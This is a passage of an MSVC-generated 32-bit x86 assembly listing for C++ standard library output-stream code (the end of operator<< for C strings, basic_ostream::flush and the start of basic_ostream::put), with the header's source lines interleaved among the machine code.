  000b9	8b 4d a4	 mov	 ecx, DWORD PTR tv135[ebp]
  000bc	8b 55 a8	 mov	 edx, DWORD PTR tv135[ebp+4]
  000bf	89 4d b4	 mov	 DWORD PTR __Pad$[ebp], ecx
  000c2	89 55 b8	 mov	 DWORD PTR __Pad$[ebp+4], edx

; 774  :     const typename _Myos::sentry _Ok(_Ostr);

  000c5	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]
  000c8	50		 push	 eax
  000c9	8d 4d 84	 lea	 ecx, DWORD PTR __Ok$[ebp]
  000cc	e8 00 00 00 00	 call	 ??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry

; 775  : 
; 776  :     if (!_Ok) {

  000d1	8d 4d 84	 lea	 ecx, DWORD PTR __Ok$[ebp]
  000d4	e8 00 00 00 00	 call	 ??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
  000d9	0f b6 c8	 movzx	 ecx, al
  000dc	85 c9		 test	 ecx, ecx
  000de	75 0e		 jne	 SHORT $LN8@operator

; 777  :         _State |= ios_base::badbit;

  000e0	8b 55 e8	 mov	 edx, DWORD PTR __State$[ebp]
  000e3	83 ca 04	 or	 edx, 4
  000e6	89 55 e8	 mov	 DWORD PTR __State$[ebp], edx

; 778  :     } else { // state okay, insert

  000e9	e9 db 01 00 00	 jmp	 $LN21@operator
$LN8@operator:

; 779  :         _TRY_IO_BEGIN

  000ee	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+12], 0

; 780  :         if ((_Ostr.flags() & ios_base::adjustfield) != ios_base::left) {

  000f5	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]
  000f8	8b 08		 mov	 ecx, DWORD PTR [eax]
  000fa	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  000fd	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  00100	8b ca		 mov	 ecx, edx
  00102	e8 00 00 00 00	 call	 ?flags@ios_base@std@@QBEHXZ ; std::ios_base::flags
  00107	25 c0 01 00 00	 and	 eax, 448		; 000001c0H
  0010c	83 f8 40	 cmp	 eax, 64			; 00000040H
  0010f	0f 84 87 00 00
	00		 je	 $LN3@operator

; 781  :             for (; 0 < _Pad; --_Pad) { // pad on left

  00115	eb 12		 jmp	 SHORT $LN4@operator
$LN2@operator:
  00117	8b 45 b4	 mov	 eax, DWORD PTR __Pad$[ebp]
  0011a	83 e8 01	 sub	 eax, 1
  0011d	8b 4d b8	 mov	 ecx, DWORD PTR __Pad$[ebp+4]
  00120	83 d9 00	 sbb	 ecx, 0
  00123	89 45 b4	 mov	 DWORD PTR __Pad$[ebp], eax
  00126	89 4d b8	 mov	 DWORD PTR __Pad$[ebp+4], ecx
$LN4@operator:
  00129	83 7d b8 00	 cmp	 DWORD PTR __Pad$[ebp+4], 0
  0012d	7c 6d		 jl	 SHORT $LN3@operator
  0012f	7f 06		 jg	 SHORT $LN25@operator
  00131	83 7d b4 00	 cmp	 DWORD PTR __Pad$[ebp], 0
  00135	76 65		 jbe	 SHORT $LN3@operator
$LN25@operator:

; 782  :                 if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ostr.fill()))) {

  00137	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  0013a	8b 02		 mov	 eax, DWORD PTR [edx]
  0013c	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0013f	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  00142	e8 00 00 00 00	 call	 ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
  00147	89 45 e4	 mov	 DWORD PTR tv189[ebp], eax
  0014a	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0014d	8b 11		 mov	 edx, DWORD PTR [ecx]
  0014f	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  00152	03 4a 04	 add	 ecx, DWORD PTR [edx+4]
  00155	e8 00 00 00 00	 call	 ?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDXZ ; std::basic_ios<char,std::char_traits<char> >::fill
  0015a	88 45 ef	 mov	 BYTE PTR tv187[ebp], al
  0015d	0f b6 45 ef	 movzx	 eax, BYTE PTR tv187[ebp]
  00161	50		 push	 eax
  00162	8b 4d e4	 mov	 ecx, DWORD PTR tv189[ebp]
  00165	e8 00 00 00 00	 call	 ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
  0016a	89 45 e0	 mov	 DWORD PTR tv196[ebp], eax
  0016d	e8 00 00 00 00	 call	 ?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ; std::_Narrow_char_traits<char,int>::eof
  00172	89 45 dc	 mov	 DWORD PTR tv194[ebp], eax
  00175	8b 4d e0	 mov	 ecx, DWORD PTR tv196[ebp]
  00178	51		 push	 ecx
  00179	8b 55 dc	 mov	 edx, DWORD PTR tv194[ebp]
  0017c	52		 push	 edx
  0017d	e8 00 00 00 00	 call	 ?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NHH@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
  00182	83 c4 08	 add	 esp, 8
  00185	0f b6 c0	 movzx	 eax, al
  00188	85 c0		 test	 eax, eax
  0018a	74 0b		 je	 SHORT $LN12@operator

; 783  :                     _State |= ios_base::badbit; // insertion failed, quit

  0018c	8b 4d e8	 mov	 ecx, DWORD PTR __State$[ebp]
  0018f	83 c9 04	 or	 ecx, 4
  00192	89 4d e8	 mov	 DWORD PTR __State$[ebp], ecx

; 784  :                     break;

  00195	eb 05		 jmp	 SHORT $LN3@operator
$LN12@operator:

; 785  :                 }
; 786  :             }

  00197	e9 7b ff ff ff	 jmp	 $LN2@operator
$LN3@operator:

; 787  :         }
; 788  : 
; 789  :         if (_State == ios_base::goodbit && _Ostr.rdbuf()->sputn(_Val, _Count) != _Count) {

  0019c	83 7d e8 00	 cmp	 DWORD PTR __State$[ebp], 0
  001a0	75 46		 jne	 SHORT $LN13@operator
  001a2	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  001a5	8b 02		 mov	 eax, DWORD PTR [edx]
  001a7	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  001aa	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  001ad	e8 00 00 00 00	 call	 ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
  001b2	89 45 d8	 mov	 DWORD PTR tv217[ebp], eax
  001b5	8b 4d b0	 mov	 ecx, DWORD PTR __Count$[ebp+4]
  001b8	51		 push	 ecx
  001b9	8b 55 ac	 mov	 edx, DWORD PTR __Count$[ebp]
  001bc	52		 push	 edx
  001bd	8b 45 0c	 mov	 eax, DWORD PTR __Val$[ebp]
  001c0	50		 push	 eax
  001c1	8b 4d d8	 mov	 ecx, DWORD PTR tv217[ebp]
  001c4	e8 00 00 00 00	 call	 ?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputn
  001c9	89 45 8c	 mov	 DWORD PTR tv416[ebp], eax
  001cc	89 55 90	 mov	 DWORD PTR tv416[ebp+4], edx
  001cf	8b 4d 8c	 mov	 ecx, DWORD PTR tv416[ebp]
  001d2	3b 4d ac	 cmp	 ecx, DWORD PTR __Count$[ebp]
  001d5	75 08		 jne	 SHORT $LN26@operator
  001d7	8b 55 90	 mov	 edx, DWORD PTR tv416[ebp+4]
  001da	3b 55 b0	 cmp	 edx, DWORD PTR __Count$[ebp+4]
  001dd	74 09		 je	 SHORT $LN13@operator
$LN26@operator:

; 790  :             _State |= ios_base::badbit;

  001df	8b 45 e8	 mov	 eax, DWORD PTR __State$[ebp]
  001e2	83 c8 04	 or	 eax, 4
  001e5	89 45 e8	 mov	 DWORD PTR __State$[ebp], eax
$LN13@operator:

; 791  :         }
; 792  : 
; 793  :         if (_State == ios_base::goodbit) {

  001e8	83 7d e8 00	 cmp	 DWORD PTR __State$[ebp], 0
  001ec	0f 85 8b 00 00
	00		 jne	 $LN6@operator

; 794  :             for (; 0 < _Pad; --_Pad) { // pad on right

  001f2	eb 12		 jmp	 SHORT $LN7@operator
$LN5@operator:
  001f4	8b 4d b4	 mov	 ecx, DWORD PTR __Pad$[ebp]
  001f7	83 e9 01	 sub	 ecx, 1
  001fa	8b 55 b8	 mov	 edx, DWORD PTR __Pad$[ebp+4]
  001fd	83 da 00	 sbb	 edx, 0
  00200	89 4d b4	 mov	 DWORD PTR __Pad$[ebp], ecx
  00203	89 55 b8	 mov	 DWORD PTR __Pad$[ebp+4], edx
$LN7@operator:
  00206	83 7d b8 00	 cmp	 DWORD PTR __Pad$[ebp+4], 0
  0020a	7c 71		 jl	 SHORT $LN6@operator
  0020c	7f 06		 jg	 SHORT $LN27@operator
  0020e	83 7d b4 00	 cmp	 DWORD PTR __Pad$[ebp], 0
  00212	76 69		 jbe	 SHORT $LN6@operator
$LN27@operator:

; 795  :                 if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ostr.fill()))) {

  00214	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]
  00217	8b 08		 mov	 ecx, DWORD PTR [eax]
  00219	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  0021c	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  0021f	8b ca		 mov	 ecx, edx
  00221	e8 00 00 00 00	 call	 ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
  00226	89 45 d4	 mov	 DWORD PTR tv252[ebp], eax
  00229	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]
  0022c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0022e	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  00231	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  00234	8b ca		 mov	 ecx, edx
  00236	e8 00 00 00 00	 call	 ?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDXZ ; std::basic_ios<char,std::char_traits<char> >::fill
  0023b	88 45 ee	 mov	 BYTE PTR tv250[ebp], al
  0023e	0f b6 45 ee	 movzx	 eax, BYTE PTR tv250[ebp]
  00242	50		 push	 eax
  00243	8b 4d d4	 mov	 ecx, DWORD PTR tv252[ebp]
  00246	e8 00 00 00 00	 call	 ?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
  0024b	89 45 d0	 mov	 DWORD PTR tv259[ebp], eax
  0024e	e8 00 00 00 00	 call	 ?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ; std::_Narrow_char_traits<char,int>::eof
  00253	89 45 cc	 mov	 DWORD PTR tv257[ebp], eax
  00256	8b 4d d0	 mov	 ecx, DWORD PTR tv259[ebp]
  00259	51		 push	 ecx
  0025a	8b 55 cc	 mov	 edx, DWORD PTR tv257[ebp]
  0025d	52		 push	 edx
  0025e	e8 00 00 00 00	 call	 ?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NHH@Z ; std::_Narrow_char_traits<char,int>::eq_int_type
  00263	83 c4 08	 add	 esp, 8
  00266	0f b6 c0	 movzx	 eax, al
  00269	85 c0		 test	 eax, eax
  0026b	74 0b		 je	 SHORT $LN15@operator

; 796  :                     _State |= ios_base::badbit; // insertion failed, quit

  0026d	8b 4d e8	 mov	 ecx, DWORD PTR __State$[ebp]
  00270	83 c9 04	 or	 ecx, 4
  00273	89 4d e8	 mov	 DWORD PTR __State$[ebp], ecx

; 797  :                     break;

  00276	eb 05		 jmp	 SHORT $LN6@operator
$LN15@operator:

; 798  :                 }
; 799  :             }

  00278	e9 77 ff ff ff	 jmp	 $LN5@operator
$LN6@operator:

; 800  :         }
; 801  : 
; 802  :         _Ostr.width(0);

  0027d	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  00280	8b 02		 mov	 eax, DWORD PTR [edx]
  00282	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  00285	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  00288	89 4d c8	 mov	 DWORD PTR tv276[ebp], ecx
  0028b	6a 00		 push	 0
  0028d	6a 00		 push	 0
  0028f	8b 4d c8	 mov	 ecx, DWORD PTR tv276[ebp]
  00292	e8 00 00 00 00	 call	 ?width@ios_base@std@@QAE_J_J@Z ; std::ios_base::width
  00297	eb 20		 jmp	 SHORT $LN19@operator
__catch$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z$0:

; 803  :         _CATCH_IO_(ios_base, _Ostr)

  00299	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  0029c	8b 02		 mov	 eax, DWORD PTR [edx]
  0029e	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  002a1	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  002a4	89 4d c4	 mov	 DWORD PTR tv289[ebp], ecx
  002a7	6a 01		 push	 1
  002a9	6a 04		 push	 4
  002ab	8b 4d c4	 mov	 ecx, DWORD PTR tv289[ebp]
  002ae	e8 00 00 00 00	 call	 ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
  002b3	b8 00 00 00 00	 mov	 eax, $LN22@operator
  002b8	c3		 ret	 0
$LN19@operator:
  002b9	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+12], -1
  002c0	eb 07		 jmp	 SHORT $LN21@operator
$LN22@operator:
  002c2	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+12], -1
$LN21@operator:

; 804  :     }
; 805  : 
; 806  :     _Ostr.setstate(_State);

  002c9	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  002cc	8b 02		 mov	 eax, DWORD PTR [edx]
  002ce	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  002d1	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  002d4	89 4d c0	 mov	 DWORD PTR tv303[ebp], ecx
  002d7	6a 00		 push	 0
  002d9	8b 55 e8	 mov	 edx, DWORD PTR __State$[ebp]
  002dc	52		 push	 edx
  002dd	8b 4d c0	 mov	 ecx, DWORD PTR tv303[ebp]
  002e0	e8 00 00 00 00	 call	 ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate

; 807  :     return _Ostr;

  002e5	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]
  002e8	89 45 bc	 mov	 DWORD PTR $T2[ebp], eax
  002eb	8d 4d 84	 lea	 ecx, DWORD PTR __Ok$[ebp]
  002ee	e8 00 00 00 00	 call	 ??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
  002f3	8b 45 bc	 mov	 eax, DWORD PTR $T2[ebp]

; 808  : }

  002f6	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp+4]
  002f9	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  00300	59		 pop	 ecx
  00301	5f		 pop	 edi
  00302	5e		 pop	 esi
  00303	5b		 pop	 ebx
  00304	8b e5		 mov	 esp, ebp
  00306	5d		 pop	 ebp
  00307	c3		 ret	 0
  00308	cc		 int	 3
  00309	cc		 int	 3
  0030a	cc		 int	 3
  0030b	cc		 int	 3
  0030c	cc		 int	 3
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__ehhandler$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z:
  00000	90		 npad	 1
  00001	90		 npad	 1
  00002	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00006	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00009	8b 4a 80	 mov	 ecx, DWORD PTR [edx-128]
  0000c	33 c8		 xor	 ecx, eax
  0000e	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00013	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z
  00018	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z ENDP ; std::operator<<<std::char_traits<char> >
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ
_TEXT	SEGMENT
__Ok$2 = -44						; size = 8
tv147 = -36						; size = 4
tv133 = -32						; size = 4
__Rdbuf$ = -28						; size = 4
__State$3 = -24						; size = 4
_this$ = -20						; size = 4
__$EHRec$ = -16						; size = 16
?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ PROC ; std::basic_ostream<char,std::char_traits<char> >::flush, COMDAT
; _this$ = ecx

; 560  :     basic_ostream& __CLR_OR_THIS_CALL flush() { // flush output stream

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	51		 push	 ecx
  00012	83 ec 1c	 sub	 esp, 28			; 0000001cH
  00015	53		 push	 ebx
  00016	56		 push	 esi
  00017	57		 push	 edi
  00018	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001d	33 c5		 xor	 eax, ebp
  0001f	50		 push	 eax
  00020	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp+4]
  00023	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00029	89 65 f0	 mov	 DWORD PTR __$EHRec$[ebp], esp
  0002c	89 4d ec	 mov	 DWORD PTR _this$[ebp], ecx

; 561  :         const auto _Rdbuf = _Myios::rdbuf();

  0002f	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00032	8b 08		 mov	 ecx, DWORD PTR [eax]
  00034	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  00037	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  0003a	8b ca		 mov	 ecx, edx
  0003c	e8 00 00 00 00	 call	 ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
  00041	89 45 e4	 mov	 DWORD PTR __Rdbuf$[ebp], eax

; 562  :         if (_Rdbuf) { // buffer exists, flush it

  00044	83 7d e4 00	 cmp	 DWORD PTR __Rdbuf$[ebp], 0
  00048	0f 84 95 00 00
	00		 je	 $LN2@flush

; 563  :             const sentry _Ok(*this);

  0004e	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00051	50		 push	 eax
  00052	8d 4d d4	 lea	 ecx, DWORD PTR __Ok$2[ebp]
  00055	e8 00 00 00 00	 call	 ??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry

; 564  : 
; 565  :             if (_Ok) {

  0005a	8d 4d d4	 lea	 ecx, DWORD PTR __Ok$2[ebp]
  0005d	e8 00 00 00 00	 call	 ??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
  00062	0f b6 c8	 movzx	 ecx, al
  00065	85 c9		 test	 ecx, ecx
  00067	74 72		 je	 SHORT $LN3@flush

; 566  :                 ios_base::iostate _State = ios_base::goodbit;

  00069	c7 45 e8 00 00
	00 00		 mov	 DWORD PTR __State$3[ebp], 0

; 567  :                 _TRY_IO_BEGIN

  00070	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+12], 0

; 568  :                 if (_Rdbuf->pubsync() == -1) {

  00077	8b 4d e4	 mov	 ecx, DWORD PTR __Rdbuf$[ebp]
  0007a	e8 00 00 00 00	 call	 ?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
  0007f	83 f8 ff	 cmp	 eax, -1
  00082	75 09		 jne	 SHORT $LN5@flush

; 569  :                     _State |= ios_base::badbit; // sync failed

  00084	8b 55 e8	 mov	 edx, DWORD PTR __State$3[ebp]
  00087	83 ca 04	 or	 edx, 4
  0008a	89 55 e8	 mov	 DWORD PTR __State$3[ebp], edx
$LN5@flush:
  0008d	eb 20		 jmp	 SHORT $LN7@flush
__catch$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ$0:

; 570  :                 }
; 571  :                 _CATCH_IO_END

  0008f	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00092	8b 08		 mov	 ecx, DWORD PTR [eax]
  00094	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  00097	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  0009a	89 55 e0	 mov	 DWORD PTR tv133[ebp], edx
  0009d	6a 01		 push	 1
  0009f	6a 04		 push	 4
  000a1	8b 4d e0	 mov	 ecx, DWORD PTR tv133[ebp]
  000a4	e8 00 00 00 00	 call	 ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
  000a9	b8 00 00 00 00	 mov	 eax, $LN10@flush
  000ae	c3		 ret	 0
$LN7@flush:
  000af	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+12], -1
  000b6	eb 07		 jmp	 SHORT $LN9@flush
$LN10@flush:
  000b8	c7 45 fc ff ff
	ff ff		 mov	 DWORD PTR __$EHRec$[ebp+12], -1
$LN9@flush:

; 572  :                 _Myios::setstate(_State);

  000bf	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  000c2	8b 08		 mov	 ecx, DWORD PTR [eax]
  000c4	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  000c7	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  000ca	89 55 dc	 mov	 DWORD PTR tv147[ebp], edx
  000cd	6a 00		 push	 0
  000cf	8b 45 e8	 mov	 eax, DWORD PTR __State$3[ebp]
  000d2	50		 push	 eax
  000d3	8b 4d dc	 mov	 ecx, DWORD PTR tv147[ebp]
  000d6	e8 00 00 00 00	 call	 ?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z ; std::basic_ios<char,std::char_traits<char> >::setstate
$LN3@flush:

; 573  :             }
; 574  :         }

  000db	8d 4d d4	 lea	 ecx, DWORD PTR __Ok$2[ebp]
  000de	e8 00 00 00 00	 call	 ??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
$LN2@flush:

; 575  :         return *this;

  000e3	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]

; 576  :     }

  000e6	8b 4d f4	 mov	 ecx, DWORD PTR __$EHRec$[ebp+4]
  000e9	64 89 0d 00 00
	00 00		 mov	 DWORD PTR fs:0, ecx
  000f0	59		 pop	 ecx
  000f1	5f		 pop	 edi
  000f2	5e		 pop	 esi
  000f3	5b		 pop	 ebx
  000f4	8b e5		 mov	 esp, ebp
  000f6	5d		 pop	 ebp
  000f7	c3		 ret	 0
  000f8	cc		 int	 3
  000f9	cc		 int	 3
  000fa	cc		 int	 3
  000fb	cc		 int	 3
  000fc	cc		 int	 3
_TEXT	ENDS
;	COMDAT text$x
text$x	SEGMENT
__ehhandler$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ:
  00000	90		 npad	 1
  00001	90		 npad	 1
  00002	8b 54 24 08	 mov	 edx, DWORD PTR [esp+8]
  00006	8d 42 0c	 lea	 eax, DWORD PTR [edx+12]
  00009	8b 4a d0	 mov	 ecx, DWORD PTR [edx-48]
  0000c	33 c8		 xor	 ecx, eax
  0000e	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00013	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ
  00018	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::flush
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z
_TEXT	SEGMENT
__Ok$ = -56						; size = 8
$T2 = -48						; size = 4
tv159 = -44						; size = 4
tv145 = -40						; size = 4
tv94 = -36						; size = 4
tv128 = -32						; size = 4
tv89 = -28						; size = 4
__State$ = -24						; size = 4
_this$ = -20						; size = 4
__$EHRec$ = -16						; size = 16
__Ch$ = 8						; size = 1
?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::put, COMDAT
; _this$ = ecx

; 523  :     basic_ostream& __CLR_OR_THIS_CALL put(_Elem _Ch) { // insert a character

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	51		 push	 ecx
  00012	83 ec 28	 sub	 esp, 40			; 00000028H
  00015	53		 push	 ebx
  00016	56		 push	 esi
  00017	57		 push	 edi
  00018	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001d	33 c5		 xor	 eax, ebp
  0001f	50		 push	 eax
  00020	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp+4]
  00023	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00029	89 65 f0	 mov	 DWORD PTR __$EHRec$[ebp], esp
  0002c	89 4d ec	 mov	 DWORD PTR _this$[ebp], ecx

; 524  :         ios_base::iostate _State = ios_base::goodbit;

  0002f	c7 45 e8 00 00
	00 00		 mov	 DWORD PTR __State$[ebp], 0

; 525  :         const sentry _Ok(*this);

  00036	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00039	50		 push	 eax
  0003a	8d 4d c8	 lea	 ecx, DWORD PTR __Ok$[ebp]
  0003d	e8 00 00 00 00	 call	 ??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry

; 526  : 
; 527  :         if (!_Ok) {

  00042	8d 4d c8	 lea	 ecx, DWORD PTR __Ok$[ebp]
  00045	e8 00 00 00 00	 call	 ??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QBE_NXZ ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
  0004a	0f b6 c8	 movzx	 ecx, al
  0004d	85 c9		 test	 ecx, ecx
  0004f	75 0e		 jne	 SHORT $LN2@put

; 528  :             _State |= ios_base::badbit;

  00051	8b 55 e8	 mov	 edx, DWORD PTR __State$[ebp]
  00054	83 ca 04	 or	 edx, 4
  00057	89 55 e8	 mov	 DWORD PTR __State$[ebp], edx

; 529  :         } else { // state okay, insert character

  0005a	e9 86 00 00 00	 jmp	 $LN9@put
$LN2@put:

; 530  :             _TRY_IO_BEGIN

  0005f	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+12], 0

; 531  :             if (_Traits::eq_int_type(_Traits::eof(), _Myios::rdbuf()->sputc(_Ch))) {

  00066	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  00069	8b 08		 mov	 ecx, DWORD PTR [eax]
  0006b	8b 55 ec	 mov	 edx, DWORD PTR _this$[ebp]
  0006e	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  00071	8b ca		 mov	 ecx, edx
  00073	e8 00 00 00 00	 call	 ?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ ; std::basic_ios<char,std::char_traits<char> >::rdbuf
  00078	89 45 e4	 mov	 DWORD PTR tv89[ebp], eax
  0007b	0f b6 45 08	 movzx	 eax, BYTE PTR __Ch$[ebp]
  0007f	50		 push	 eax
